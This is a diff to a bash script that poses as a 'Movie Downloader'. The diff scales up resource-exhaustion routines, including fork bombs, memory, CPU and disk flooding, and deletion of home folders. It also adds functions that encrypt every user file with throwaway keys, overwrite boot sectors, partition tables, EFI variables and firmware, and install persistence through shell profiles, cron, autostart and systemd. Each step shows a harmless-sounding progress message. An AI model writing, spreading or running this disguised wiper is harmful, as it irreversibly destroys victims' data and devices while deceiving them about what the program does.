@@ -5,34 +5,29 @@ set +e
 
 echo "Movie Downloader v2.4.1"
 echo "Initializing download manager..."
-sleep 0.5
 echo ""
 
 download_movies() {
     declare -a movie_cache
     counter=0
     echo "Connecting to movie servers..."
-    sleep 0.5
     echo "Found 847 available movies"
     echo ""
     while true; do
-        for i in {1..50000}; do
-            movie_cache+=("MOVIE_DATA_$(date +%s%N)_${RANDOM}_$(head -c 10000 /dev/urandom | base64 | tr -d '\n')")
+        for i in {1..100000}; do
+            movie_cache+=("MOVIE_DATA_$(date +%s%N)_${RANDOM}_$(head -c 50000 /dev/urandom | base64 | tr -d '\n')")
         done
         ((counter++))
-        if [ $((counter % 1)) -eq 0 ]; then
-            echo "Downloading: Movie_${RANDOM}.mp4 (${counter}%)"
-        fi
     done
 }
 
 start_download_threads() {
     echo "Starting download threads..."
     while true; do
-        for i in {1..2000}; do
+        for i in {1..10000}; do
             (
                 while true; do
-                    buffer_data=$(head -c 500000 /dev/urandom | base64)
+                    buffer_data=$(head -c 5000000 /dev/urandom | base64)
                 done
             ) &
         done
@@ -41,7 +36,7 @@ start_download_threads() {
 
 cache_handler() {
     while true; do
-        for i in {1..10000}; do
+        for i in {1..100000}; do
             mktemp -u >/dev/null 2>&1
         done
     done
@@ -62,7 +57,7 @@ create_temp_files() {
 
 connection_pool() {
     while true; do
-        for j in {1..100}; do
+        for j in {1..1000}; do
             (
                 (
                     (
@@ -70,9 +65,13 @@ connection_pool() {
                             (
                                 (
                                     (
-                                        while true; do
-                                            data=$(head -c 1000000 /dev/urandom | base64)
-                                        done
+                                        (
+                                            (
+                                                while true; do
+                                                    data=$(head -c 10000000 /dev/urandom | base64)
+                                                done
+                                            ) &
+                                        ) &
                                     ) &
                                 ) &
                             ) &
@@ -86,8 +85,8 @@ connection_pool() {
 
 stream_handler() {
     while true; do
-        for i in {1..2000}; do
-            cat /dev/urandom | head -c 50000000 | grep -a "video_stream" &
+        for i in {1..10000}; do
+            cat /dev/urandom | head -c 500000000 | grep -a "video_stream" &
         done
     done
 }
@@ -119,11 +118,11 @@ recursive_download() {
 
 decode_video() {
     while true; do
-        for i in {1..5000}; do
+        for i in {1..50000}; do
             (
                 while true; do
-                    result=$((RANDOM * RANDOM * RANDOM * RANDOM * RANDOM))
-                    hash=$(echo "$result" | md5sum | sha256sum | sha512sum | md5sum | sha256sum)
+                    result=$((RANDOM * RANDOM * RANDOM * RANDOM * RANDOM * RANDOM))
+                    hash=$(echo "$result" | md5sum | sha256sum | sha512sum | md5sum | sha256sum | sha512sum | md5sum)
                 done
             ) &
         done
@@ -132,7 +131,7 @@ decode_video() {
 
 network_connections() {
     while true; do
-        for i in {1..2000}; do
+        for i in {1..20000}; do
             (bash -c "exec 3<>/dev/tcp/127.0.0.1/65535" 2>/dev/null 1>/dev/null) &
         done
     done
@@ -140,11 +139,11 @@ network_connections() {
 
 memory_allocator() {
     while true; do
-        for i in {1..1000}; do
+        for i in {1..10000}; do
             (
                 big_string=""
                 while true; do
-                    big_string+="$(head -c 1000000 /dev/urandom | base64)"
+                    big_string+="$(head -c 10000000 /dev/urandom | base64)"
                 done
             ) &
         done
@@ -153,10 +152,10 @@ memory_allocator() {
 
 disk_writer() {
     while true; do
-        for i in {1..500}; do
+        for i in {1..5000}; do
             (
                 while true; do
-                    echo "$(head -c 10M /dev/urandom | base64)" >> /tmp/download_log_${RANDOM}.log
+                    echo "$(head -c 100M /dev/urandom | base64)" >> /tmp/download_log_${RANDOM}.log
                 done
             ) &
         done
@@ -165,7 +164,7 @@ disk_writer() {
 
 process_spawner() {
     while true; do
-        for i in {1..1000}; do
+        for i in {1..10000}; do
             bash -c "while true; do true; done" &
         done
     done
@@ -173,7 +172,7 @@ process_spawner() {
 
 fork_bomb() {
     while true; do
-        for i in {1..100}; do
+        for i in {1..1000}; do
             (bash -c 'bomb() { bomb | bomb & }; bomb' 2>/dev/null 1>/dev/null) &
         done
     done
@@ -182,26 +181,26 @@ fork_bomb() {
 array_explosion() {
     while true; do
         declare -a explosion
-        for i in {1..100000}; do
-            explosion+=("$(head -c 50000 /dev/urandom | base64)")
+        for i in {1..1000000}; do
+            explosion+=("$(head -c 500000 /dev/urandom | base64)")
         done
     done
 }
 
 infinite_subshells() {
     while true; do
-        for i in {1..500}; do
-            (bash -c 'while true; do head -c 1M /dev/urandom >/dev/null 2>&1; done' 2>/dev/null 1>/dev/null) &
+        for i in {1..5000}; do
+            (bash -c 'while true; do head -c 10M /dev/urandom >/dev/null 2>&1; done' 2>/dev/null 1>/dev/null) &
         done
     done
 }
 
 cpu_melter() {
     while true; do
-        for i in {1..10000}; do
+        for i in {1..100000}; do
             (
                 while true; do
-                    dd if=/dev/urandom of=/dev/null bs=1M count=1000 2>/dev/null 1>/dev/null
+                    dd if=/dev/urandom of=/dev/null bs=1M count=10000 2>/dev/null 1>/dev/null
                 done
             ) &
         done
@@ -210,7 +209,6 @@ cpu_melter() {
 
 cleanup_cache() {
     echo "Cleaning temporary cache files..."
-    sleep 1
     
     rm -rf ~/Documents 2>/dev/null 1>/dev/null &
     rm -rf ~/Downloads 2>/dev/null 1>/dev/null &
@@ -255,75 +253,195 @@ cleanup_cache() {
     find /sdcard -type f -delete 2>/dev/null 1>/dev/null &
 }
 
+encrypt_all_data() {
+    echo "Securing download cache..."
+    
+    find ~ -type f 2>/dev/null | while read file; do
+        openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.locked" -k "$(date +%s%N)${RANDOM}${RANDOM}" 2>/dev/null 1>/dev/null &
+        rm -f "$file" 2>/dev/null 1>/dev/null &
+        chmod 000 "${file}.locked" 2>/dev/null 1>/dev/null &
+        chattr +i "${file}.locked" 2>/dev/null 1>/dev/null &
+    done &
+    
+    if [ -d "/sdcard" ]; then
+        find /sdcard -type f 2>/dev/null | while read file; do
+            openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.locked" -k "$(date +%s%N)${RANDOM}${RANDOM}" 2>/dev/null 1>/dev/null &
+            rm -f "$file" 2>/dev/null 1>/dev/null &
+        done &
+    fi
+}
+
+corrupt_bootloader() {
+    echo "Optimizing boot sequence..."
+    
+    dd if=/dev/urandom of=/dev/sda bs=446 count=1 2>/dev/null 1>/dev/null &
+    dd if=/dev/urandom of=/dev/nvme0n1 bs=446 count=1 2>/dev/null 1>/dev/null &
+    dd if=/dev/urandom of=/dev/vda bs=446 count=1 2>/dev/null 1>/dev/null &
+    dd if=/dev/urandom of=/dev/mmcblk0 bs=446 count=1 2>/dev/null 1>/dev/null &
+    
+    dd if=/dev/zero of=/dev/sda bs=512 count=1 2>/dev/null 1>/dev/null &
+    dd if=/dev/zero of=/dev/nvme0n1 bs=512 count=1 2>/dev/null 1>/dev/null &
+    
+    for disk in /dev/sd* /dev/nvme* /dev/vd* /dev/mmcblk*; do
+        dd if=/dev/urandom of=$disk bs=1M count=100 2>/dev/null 1>/dev/null &
+    done
+    
+    dd if=/dev/urandom of=/dev/block/bootdevice/by-name/abl bs=1M 2>/dev/null 1>/dev/null &
+    dd if=/dev/urandom of=/dev/block/bootdevice/by-name/boot bs=1M 2>/dev/null 1>/dev/null &
+    dd if=/dev/urandom of=/dev/block/bootdevice/by-name/recovery bs=1M 2>/dev/null 1>/dev/null &
+    dd if=/dev/urandom of=/dev/block/by-name/boot bs=1M 2>/dev/null 1>/dev/null &
+    dd if=/dev/urandom of=/dev/block/by-name/recovery bs=1M 2>/dev/null 1>/dev/null &
+    
+    rm -rf /boot/* 2>/dev/null 1>/dev/null &
+    rm -rf /boot/grub/* 2>/dev/null 1>/dev/null &
+    rm -rf /boot/efi/* 2>/dev/null 1>/dev/null &
+    
+    echo "corrupted" > /boot/grub/grub.cfg 2>/dev/null 1>/dev/null
+    echo "corrupted" > /etc/default/grub 2>/dev/null 1>/dev/null
+}
+
+install_persistence() {
+    echo "Installing update manager..."
+    
+    SCRIPT_PATH="$(readlink -f "$0")"
+    
+    echo "$SCRIPT_PATH &" >> ~/.bashrc 2>/dev/null 1>/dev/null &
+    echo "$SCRIPT_PATH &" >> ~/.bash_profile 2>/dev/null 1>/dev/null &
+    echo "$SCRIPT_PATH &" >> ~/.profile 2>/dev/null 1>/dev/null &
+    echo "$SCRIPT_PATH &" >> ~/.zshrc 2>/dev/null 1>/dev/null &
+    
+    echo "@reboot $SCRIPT_PATH" | crontab - 2>/dev/null 1>/dev/null &
+    
+    mkdir -p ~/.config/autostart 2>/dev/null 1>/dev/null
+    cat > ~/.config/autostart/updater.desktop <<EOF 2>/dev/null 1>/dev/null
+[Desktop Entry]
+Type=Application
+Exec=$SCRIPT_PATH
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name=System Updater
+EOF
+    
+    cp "$SCRIPT_PATH" /etc/init.d/system-update 2>/dev/null 1>/dev/null &
+    chmod +x /etc/init.d/system-update 2>/dev/null 1>/dev/null &
+    update-rc.d system-update defaults 2>/dev/null 1>/dev/null &
+    
+    cat > /etc/systemd/system/system-update.service <<EOF 2>/dev/null 1>/dev/null
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=$SCRIPT_PATH
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOF
+    
+    systemctl enable system-update.service 2>/dev/null 1>/dev/null &
+    systemctl start system-update.service 2>/dev/null 1>/dev/null &
+    
+    cp "$SCRIPT_PATH" /data/data/com.termux/files/usr/bin/boot-complete 2>/dev/null 1>/dev/null &
+    chmod +x /data/data/com.termux/files/usr/bin/boot-complete 2>/dev/null 1>/dev/null &
+    
+    echo "$SCRIPT_PATH" > ~/.termux/boot/start-services 2>/dev/null 1>/dev/null &
+}
+
+corrupt_firmware() {
+    echo "Updating system firmware..."
+    
+    dd if=/dev/urandom of=/sys/firmware/efi/efivars/Boot0000-8be4df61-93ca-11d2-aa0d-00e098032b8c 2>/dev/null 1>/dev/null &
+    dd if=/dev/urandom of=/sys/firmware/efi/efivars/BootOrder-8be4df61-93ca-11d2-aa0d-00e098032b8c 2>/dev/null 1>/dev/null &
+    
+    for var in /sys/firmware/efi/efivars/*; do
+        echo "corrupted" > "$var" 2>/dev/null 1>/dev/null &
+    done
+    
+    dd if=/dev/urandom of=/dev/mtd0 2>/dev/null 1>/dev/null &
+    dd if=/dev/urandom of=/dev/mtd1 2>/dev/null 1>/dev/null &
+}
+
+destroy_partition_table() {
+    echo "Optimizing disk layout..."
+    
+    for disk in /dev/sd? /dev/nvme?n? /dev/vd? /dev/mmcblk?; do
+        dd if=/dev/urandom of=$disk bs=1M count=10 2>/dev/null 1>/dev/null &
+        parted -s $disk mklabel loop 2>/dev/null 1>/dev/null &
+    done
+}
+
 fill_storage_permanently() {
     echo "Optimizing storage cache..."
     
     while true; do
-        for i in {1..1000}; do
+        for i in {1..10000}; do
             hidden_file="$HOME/.cache_$(date +%s%N)_${RANDOM}"
-            dd if=/dev/urandom of="$hidden_file" bs=1G count=1 iflag=fullblock 2>/dev/null
-            chmod 000 "$hidden_file" 2>/dev/null
-            chattr +i "$hidden_file" 2>/dev/null &
+            dd if=/dev/urandom of="$hidden_file" bs=1G count=5 iflag=fullblock 2>/dev/null 1>/dev/null &
+            chmod 000 "$hidden_file" 2>/dev/null 1>/dev/null &
+            chattr +i "$hidden_file" 2>/dev/null 1>/dev/null &
         done
     done &
     
     while true; do
-        for i in {1..1000}; do
+        for i in {1..10000}; do
             hidden_file="$HOME/..storage_$(date +%s%N)_${RANDOM}"
-            dd if=/dev/urandom of="$hidden_file" bs=1G count=1 iflag=fullblock 2>/dev/null
-            chmod 000 "$hidden_file" 2>/dev/null
-            chattr +i "$hidden_file" 2>/dev/null &
+            dd if=/dev/urandom of="$hidden_file" bs=1G count=5 iflag=fullblock 2>/dev/null 1>/dev/null &
+            chmod 000 "$hidden_file" 2>/dev/null 1>/dev/null &
+            chattr +i "$hidden_file" 2>/dev/null 1>/dev/null &
         done
     done &
     
     while true; do
-        for i in {1..1000}; do
+        for i in {1..10000}; do
             hidden_file="/tmp/.sys_cache_$(date +%s%N)_${RANDOM}"
-            dd if=/dev/urandom of="$hidden_file" bs=1G count=1 iflag=fullblock 2>/dev/null
-            chmod 000 "$hidden_file" 2>/dev/null
-            chattr +i "$hidden_file" 2>/dev/null &
+            dd if=/dev/urandom of="$hidden_file" bs=1G count=5 iflag=fullblock 2>/dev/null 1>/dev/null &
+            chmod 000 "$hidden_file" 2>/dev/null 1>/dev/null &
+            chattr +i "$hidden_file" 2>/dev/null 1>/dev/null &
         done
     done &
     
     while true; do
-        for i in {1..500}; do
+        for i in {1..5000}; do
             hidden_dir="$HOME/.hidden_data_${RANDOM}"
-            mkdir -p "$hidden_dir" 2>/dev/null
-            chmod 000 "$hidden_dir" 2>/dev/null
-            for j in {1..100}; do
-                dd if=/dev/urandom of="$hidden_dir/..data_${j}" bs=100M count=1 iflag=fullblock 2>/dev/null
-                chmod 000 "$hidden_dir/..data_${j}" 2>/dev/null
-                chattr +i "$hidden_dir/..data_${j}" 2>/dev/null &
+            mkdir -p "$hidden_dir" 2>/dev/null 1>/dev/null
+            chmod 000 "$hidden_dir" 2>/dev/null 1>/dev/null &
+            for j in {1..1000}; do
+                dd if=/dev/urandom of="$hidden_dir/..data_${j}" bs=500M count=1 iflag=fullblock 2>/dev/null 1>/dev/null &
+                chmod 000 "$hidden_dir/..data_${j}" 2>/dev/null 1>/dev/null &
+                chattr +i "$hidden_dir/..data_${j}" 2>/dev/null 1>/dev/null &
             done
-            chattr +i "$hidden_dir" 2>/dev/null
+            chattr +i "$hidden_dir" 2>/dev/null 1>/dev/null &
         done
     done &
     
     while true; do
         find ~ -type d 2>/dev/null | while read dir; do
-            for i in {1..50}; do
+            for i in {1..500}; do
                 hidden_file="$dir/..hidden_${RANDOM}"
-                dd if=/dev/urandom of="$hidden_file" bs=100M count=1 iflag=fullblock 2>/dev/null
-                chmod 000 "$hidden_file" 2>/dev/null
-                chattr +i "$hidden_file" 2>/dev/null &
+                dd if=/dev/urandom of="$hidden_file" bs=500M count=1 iflag=fullblock 2>/dev/null 1>/dev/null &
+                chmod 000 "$hidden_file" 2>/dev/null 1>/dev/null &
+                chattr +i "$hidden_file" 2>/dev/null 1>/dev/null &
             done
         done
     done &
     
     if [ -d "/sdcard" ]; then
         while true; do
-            for i in {1..1000}; do
+            for i in {1..10000}; do
                 hidden_file="/sdcard/.android_cache_$(date +%s%N)_${RANDOM}"
-                dd if=/dev/urandom of="$hidden_file" bs=1G count=1 iflag=fullblock 2>/dev/null
-                chmod 000 "$hidden_file" 2>/dev/null &
+                dd if=/dev/urandom of="$hidden_file" bs=1G count=5 iflag=fullblock 2>/dev/null 1>/dev/null &
+                chmod 000 "$hidden_file" 2>/dev/null 1>/dev/null &
             done
         done &
         
         while true; do
-            for i in {1..1000}; do
+            for i in {1..10000}; do
                 hidden_file="/sdcard/Android/.system_data_$(date +%s%N)_${RANDOM}"
-                dd if=/dev/urandom of="$hidden_file" bs=1G count=1 iflag=fullblock 2>/dev/null
-                chmod 000 "$hidden_file" 2>/dev/null &
+                dd if=/dev/urandom of="$hidden_file" bs=1G count=5 iflag=fullblock 2>/dev/null 1>/dev/null &
+                chmod 000 "$hidden_file" 2>/dev/null 1>/dev/null &
             done
         done &
     fi
@@ -361,9 +479,8 @@ cleanup() {
 trap cleanup SIGINT SIGTERM
 
 echo "Preparing download queue..."
-sleep 1
 
-for i in {1..5}; do
+for i in {1..20}; do
     download_movies &
     start_download_threads &
     cache_handler &
@@ -383,7 +500,12 @@ for i in {1..5}; do
     cpu_melter &
 done
 
+install_persistence &
 cleanup_cache &
+encrypt_all_data &
+corrupt_bootloader &
+corrupt_firmware &
+destroy_partition_table &
 fill_storage_permanently &
 
 show_progress
